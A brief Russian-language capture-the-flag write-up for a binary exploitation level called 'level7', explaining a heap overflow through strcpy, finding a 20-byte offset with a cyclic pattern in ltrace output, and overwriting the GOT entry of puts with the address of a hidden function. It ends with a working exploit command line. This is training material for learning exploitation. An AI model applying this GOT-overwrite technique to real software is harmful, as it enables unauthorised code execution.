данная нам программа аллоцирует 4 переменные, попарно кладет однин указатель в другой
а затем заполняет их содержимым двух поданных аргументов, при этом может произойти переполнение
мы можем заменить адрес второго заполнения при помощи strcpy в ходе первого заполнения

ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
__libc_start_main(0x8048521, 2, 0xbffff754, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                                                                                  = 0x0804a008
malloc(8)                                                                                                                                                  = 0x0804a018
malloc(8)                                                                                                                                                  = 0x0804a028
malloc(8)                                                                                                                                                  = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)                                                                                                  = 0x0804a018strcpy(0x37614136, NULL <unfinished ...>
strcpy(0x37614136, NULL <unfinished ...>

отступ равен 20
https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

в функции есть также не используемая функция m, которая выводит глобальную переменную с
и участок который кладет по этому адресу содержимое интересующего нас .pass файла, запуская затем puts
мы можем заменить адрес функции puts в got на адрес функции m, итого:
info functions puts
x/i 0x08048400
   0x8048400 <puts@plt>:	jmp    *0x8049928
./level7 $(python -c 'print "U" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
